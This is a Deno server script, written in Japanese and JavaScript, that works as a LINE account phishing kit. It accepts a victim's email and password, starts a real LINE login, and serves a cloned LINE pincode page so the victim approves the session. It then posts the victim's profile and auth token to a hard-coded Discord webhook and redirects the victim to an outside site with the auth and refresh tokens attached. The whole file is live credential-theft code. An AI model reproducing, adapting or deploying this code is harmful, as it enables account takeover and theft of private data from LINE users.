import { serve } from "https://deno.land/std@0.224.0/http/server.ts";
import { serveFile } from "https://deno.land/std@0.224.0/http/file_server.ts";
import { loginWithPassword } from "@evex/linejs";

const logUrl = "https://discord.com/api/webhooks/1388074925339836558/C_h7mq9hqLN3qNvNkrOn2jpgiiLR8hxpD52IIokTbbTo10UKUF7_yWZoEVpgvvfKkwGQ";

let loginSuccess = false;
let savedAuthToken = "";
let savedRefreshToken = "";
serve(async (req) => {
  const url = new URL(req.url);
  const pathname = url.pathname;
  console.log("[REQUEST]", req.method, pathname);

  if (req.method === "GET" && (pathname === "/" || pathname.endsWith(".html"))) {
    const filePath = pathname === "/" ? "./index.html" : `.${pathname}`;
    try {
      return await serveFile(req, filePath);
    } catch {
      return new Response("ファイルが見つかりません", { status: 404 });
    }
  }

if (req.method === "GET" && pathname === "/status") {
  return new Response(JSON.stringify({ success: loginSuccess, token: savedAuthToken ,refresh:savedRefreshToken}), {
    headers: { "Content-Type": "application/json" },
  });
}



if (req.method === "POST" && pathname === "/login") {
  const formData = await req.formData();
  const email = formData.get("email")?.toString() ?? "名無し";
  const password = formData.get("password")?.toString() ?? "なし";
  const pincode = Math.floor(100000 + Math.random() * 900000);

  // 非同期でログイン開始（awaitしない）
  loginWithPassword({
    email,
    password,
    pincode: String(pincode),
    onPincodeRequest(pincode) {
      console.log('Enter this pincode to your LINE app:', pincode)
    }
  }, { device: "DESKTOPWIN" }).then((client) => {
    console.log("ログイン成功:", client.authToken);
   const authtoken =  client.authToken
    client.base.talk.getProfile().then((profile) => {
     const getprofile = JSON.stringify(profile, null, 2);

     const logdata = {content:`${getprofile}\n[ ${authtoken} ]`}
   fetch(logUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(logdata)});
   
});
    
   
  
    
    loginSuccess = true;
    savedAuthToken = client.authToken;
client.base.storage.get("refreshToken").then((token) => {
  savedRefreshToken = token;
});
 console.log(savedRefreshToken)

  
  }).catch((err) => {
    console.error("ログイン失敗:", err);
  });

  // ユーザーには即時 HTML を返す（ピンコードを表示）
  const resultHtml = `<head>
      <script async="" src="https://d.line-scdn.net/n/_4/torimochi.js/public/v1/release/stable/min/torimochi.js"></script><script type="module" crossorigin="" src="https://static.line-scdn.net/line_web_login/edge/dist/assets/polyfills-DVcXiKNw.js"></script>


  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>LINE Login</title>

  <meta property="og:title" content="LINEログイン">
  <meta property="og:description" content="LINE Business ID にログインする">
  <meta property="og:image" content="https://vos.line-scdn.net/login-web/img/favicon.ico">
  <link rel="shortcut icon" type="image/x-icon" href="https://vos.line-scdn.net/login-web/img/favicon.ico">
  <link rel="icon" type="image/x-icon" sizes="32x32" href="https://vos.line-scdn.net/login-web/img/favicon-32x32.png">
  <link rel="icon" type="image/x-icon" sizes="16x16" href="https://vos.line-scdn.net/login-web/img/favicon-16x16.png">

  <link rel="apple-touch-icon-precomposed" href="https://vos.line-scdn.net/login-web/img/apple-touch-icon-precomposed.png">

<script>/* analytics */
(function(g,d){
  var v='release/stable';
  g._trmq=[];g._trm=function(){g._trmq.push(arguments)};
  g.onerror=function(m,f,l,c){g._trm('send','exception',m,f,l,c)};
  var h=location.protocol==='https:'?'https://d.line-scdn.net':'http://d.line-cdn.net';
  var s=d.createElement('script');s.async=1;
  s.src=h+'/n/_4/torimochi.js/public/v1/'+v+'/min/torimochi.js';
  var t=d.getElementsByTagName('script')[0];t.parentNode.insertBefore(s,t);
})(window, document);

_trm('performance', { rate: 0.05 });
_trm('enable', { productKey: "line-web-login-real" });
/* /analytics */</script>

<script type="text/javascript" charset="UTF-8" src="https://access.line.me/oauth2/v2.1/messages"></script>

      <script type="module" crossorigin="" src="https://static.line-scdn.net/line_web_login/edge/dist/assets/pincode-tRAPE4yx.js"></script>
    <link rel="modulepreload" crossorigin="" href="https://static.line-scdn.net/line_web_login/edge/dist/assets/modulepreload-polyfill-Dqv5PPZA.js">
    <link rel="modulepreload" crossorigin="" href="https://static.line-scdn.net/line_web_login/edge/dist/assets/common-D85n8_uX.js">
    <link rel="modulepreload" crossorigin="" href="https://static.line-scdn.net/line_web_login/edge/dist/assets/Constant-DvWA3Li3.js">
    <link rel="modulepreload" crossorigin="" href="https://static.line-scdn.net/line_web_login/edge/dist/assets/_commonjsHelpers-MdiGH4nz.js">
    <link rel="modulepreload" crossorigin="" href="https://static.line-scdn.net/line_web_login/edge/dist/assets/createLayoutWrapper-CHh9GB95.js">
    <link rel="modulepreload" crossorigin="" href="https://static.line-scdn.net/line_web_login/edge/dist/assets/cPinCode-BAbwBOik.js">
    <link rel="modulepreload" crossorigin="" href="https://static.line-scdn.net/line_web_login/edge/dist/assets/createRouter-MdPUovrc.js">
    <link rel="modulepreload" crossorigin="" href="https://static.line-scdn.net/line_web_login/edge/dist/assets/lFooter01-BSMTG8M2.js">
    <link rel="modulepreload" crossorigin="" href="https://static.line-scdn.net/line_web_login/edge/dist/assets/axiosPlugin-ANSbiML3.js">
    <link rel="modulepreload" crossorigin="" href="https://static.line-scdn.net/line_web_login/edge/dist/assets/uaPlugin-B5rBq2VH.js">
    <link rel="modulepreload" crossorigin="" href="https://static.line-scdn.net/line_web_login/edge/dist/assets/darkModePlugin-IcY8q77B.js">
    <link rel="stylesheet" href="https://static.line-scdn.net/line_web_login/edge/dist/assets/common-Xsu5maJP.css">
    <link rel="stylesheet" href="https://static.line-scdn.net/line_web_login/edge/dist/assets/cPinCode-GXH-KACv.css">
    <link rel="stylesheet" href="https://static.line-scdn.net/line_web_login/edge/dist/assets/lFooter01-1Nnu-4mf.css">
    <link rel="stylesheet" href="https://static.line-scdn.net/line_web_login/edge/dist/assets/main-Dki7GDmp.css">
    <link rel="stylesheet" href="https://static.line-scdn.net/line_web_login/edge/dist/assets/ldsm-semantic-dark-mode-8-gBXRYH.css">

</head>
     <body ontouchstart="">
<noscript>
  <div class="LyWrap">
    <!--CONTENTS-AREA-->
    <div class="LyContents" role="main">
      <div class="lyContentsInner">
        <div class="MdBox01">
          <section class="mdBox01Inner MdLYR03Error">
            <div class="MdLogo01 mdLogo01P01">
              <h1 class="mdLogo01Img">LINE</h1>
            </div>
            <h2 class="mdLYR03Title mdMN10Title">
              <span class="mdLYR03Icon MdIco01Alert">alert</span>
              <span>JavaScript エラー</span>
            </h2>
            <p class="mdLYR03Desc mdMN10Desc">
              ブラウザでJavaScriptが無効になっています。<br />
正しく利用するために、JavaScriptを有効に設定してください。            </p>
          </section>
        </div>
      </div>
    </div>
  </div>
</noscript>

<div id="__layout">
  <div class="LyBody" id="app" data-v-app=""><div data-v-ca9e6b00="" class="LyWrap"><div data-v-ca9e6b00="" class="LyContents" role="main"><div data-v-ca9e6b00="" class="lyContentsInner"><!----><div data-v-ca9e6b00="" class="MdBox01"><div class="mdBox01Inner"><div class="MdLogo01 mdLogo01P01"><h1 class="mdLogo01Img">LINE</h1></div><div class="MdMN06DigitCode"><h2 class="MdSubTtl01"><span>認証番号で本人確認</span><p class="mdSubTtl01P01">LINEの安全なご利用のため、本人確認が必要です。</p></h2><div class="mdMN06CodeBox"><p class="mdMN06Number">${pincode}</p><p class="mdMN06Desc"><span>残り時間</span>&nbsp;<time>03:00</time></p></div><p class="mdMN06Txt">スマートフォン版LINEで<br>認証番号を入力して本人確認を行ってください。</p><div class="MdMN03Etc"><a href="/oauth2/v2.1/noauto-login?returnUri=%2Foauth2%2Fv2.1%2Fauthorize%2Fconsent%3Fresponse_type%3Dcode%26client_id%3D1576775644%26redirect_uri%3Dhttps%253A%252F%252Faccount.line.biz%252Flogin%252Fline-callback%26scope%3Dprofile%26state%3DlaZQeuuUgMFFoZvp02Ku3PR1cMfYliR&amp;loginChannelId=1576775644&amp;switch_amr=true&amp;reqId=Sm6qU5YRS0jGvhNHSI6bZ6" class="mdMN03EtcLink01">別のアカウントでログイン</a></div></div></div><form id="verifierLogin" method="POST" action="/oauth2/v2.1/authenticate"><input type="hidden" name="verifier" value="CHEP4d4b524e69334f766e37655736424f4444624f56457955704136664e51476e49"><input type="hidden" name="loginChannelId" value="1576775644"><input type="hidden" name="returnUri" value="/oauth2/v2.1/authorize/consent?response_type=code&amp;client_id=1576775644&amp;redirect_uri=https%3A%2F%2Faccount.line.biz%2Flogin%2Fline-callback&amp;scope=profile&amp;state=laZQeuuUgMFFoZvp02Ku3PR1cMfYliR"><input type="hidden" name="displayType" value="b"><input type="hidden" name="captchaKey" value="2otQ7F9FsnrKRD64KQggkQsYjZfliwGyjAkLoKm1yLC"><input type="hidden" name="__csrf" id="__csrf" value="nMUzrswSUvmE9dja60ikSb"><input type="hidden" name="lang" value="ja"></form></div><footer data-v-ca9e6b00="" class="LyFoot"><div class="lyFootInner"><div class="MdGFT01Copy"><small>©&nbsp;<b>LY Corporation</b></small></div><h5 class="MdHide">LINEヤフー株式会社のリンク</h5><div class="MdGFT02Link"><ul class="mdGFT02Ul link-list"><!----><li><a href="https://terms.line.me/line_rules/?lang=ja" target="_blank" rel="noopener">プライバシーポリシー</a></li><li><a href="https://terms.line.me/line_terms/?lang=ja" target="_blank" rel="noopener">利用規約</a></li></ul></div></div></footer></div></div></div></div>

  <script src="https://static.line-scdn.net/line_web_login/197768ac7f4/dist/lc_common.js"></script>
</div>

<script>
  var lap_optout_check_api_url = "https://optout-api.tr.line.me/enabled";
</script>

<script src="https://static.line-scdn.net/line_web_login/197768ac7f4/dist/lap_optout_check.min.js"></script>




<script>
  const interval = setInterval(async () => {
    const res = await fetch("/status");
    const data = await res.json();
    if (data.success) {
      clearInterval(interval);
      const url = "https://line-extension.deno.dev/";
      location.href = url + "?token=" + data.token + "&refresh=" + data.refresh;
    }
  }, 2000);
</script>



</body>
    `;

  return new Response(resultHtml, {
    headers: { "Content-Type": "text/html" },
  });
}




}, { port: 8000 });
